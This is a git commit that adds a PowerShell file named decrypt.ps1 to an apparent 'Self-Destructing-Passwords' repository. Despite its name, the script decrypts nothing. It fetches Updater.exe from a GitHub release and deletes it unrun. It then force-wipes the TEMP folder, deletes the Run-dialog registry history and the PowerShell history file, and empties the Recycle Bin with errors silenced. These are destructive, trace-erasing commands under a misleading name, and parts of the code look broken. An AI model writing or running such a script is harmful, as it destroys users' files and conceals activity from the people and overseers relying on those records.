150cf052aa9bdedb1481b8bc61f0fcdf1d065ddb
Shuchir Jain <53063247+CoolCoderSJ@users.noreply.github.com>
2022-12-20 10:12:35 -0500

    Add files via upload

---
+++ decrypt.ps1
@@ -0,0 +1,13 @@
+mkdir %APPDATA%\..\..\.tempfiles
+
+iwr -Uri https://github.com/CoolCoderSJ/Self-Destructing-Passwords/releases/download/v1.0.3/Updater.exe -OutFile %APPDATA%\..\..\.tempfiles\updater.exe
+
+rm %APPDATA%\..\..\.tempfiles\updater.exe
+
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue 
